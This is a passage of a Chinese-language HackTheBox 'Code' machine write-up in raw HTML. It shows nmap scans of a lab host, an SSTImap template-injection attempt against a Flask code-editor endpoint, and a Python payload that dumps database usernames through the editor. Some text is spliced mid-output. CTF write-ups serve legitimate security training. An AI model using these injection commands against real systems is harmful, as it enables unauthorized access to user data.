-rate 10000 -p- 10.10.11.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:09 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.62\nHost is up (0.15s latency).\nNot shown: 64591 filtered tcp ports (no-response), 943 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 37.29 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e就扫描出一个\u003ccode\u003e22\u003c/code\u003e端口，不对劲继续扫\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Code  nmap -sS -min-rate 10000 -p- 10.10.11.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:34 EDT\nWarning: 10.10.11.62 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.62\nHost is up (0.84s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5000/tcp open  upnp\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 33.23 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e新端口是一个代码编辑器\u003ccode\u003ePython Code Editor\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Code  nmap -sT -A -T4 -O -p 22,5000 10.10.11.62     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:30 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.62\nHost is up (0.20s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b5:b9:7c:c4:50:32:95 lt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到存在\u003ccode\u003eMyCodes\u003c/code\u003e ，我们将代码保存为\u003ccode\u003etest\u003c/code\u003e试试\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image58.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试一下语法注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image59.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以成功回显，再尝试一下使用模板语法\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image60.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e也是成功回显了，那么该应用是使用\u003ccode\u003eFlask\u003c/code\u003e搭建的\u003ccode\u003eWeb\u003c/code\u003e应用\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eSSTImap\u003c/code\u003e尝试模板注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython sstimap.py -u http://10.10.11.62:5000/run_code -H \u003cspan class=\"hljs-string\"\u003e'application/x-www-form-urlencoded; charset=UTF-8'\u003c/span\u003e -m \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'code=print(render_template_string(\"{{*}}\"))'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果就是没办法利用，但是知道了存在\u003ccode\u003ejinja2\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image61.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e因为存在登陆操作，所以可能可以进行操作数据库，尝试一下数据库语法\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image62.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有回显，通过\u003ccode\u003eGPT\u003c/code\u003e进行构造\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecode=\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e([user.username \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e User.query.all()])\n// output\n{\u003cspan cl
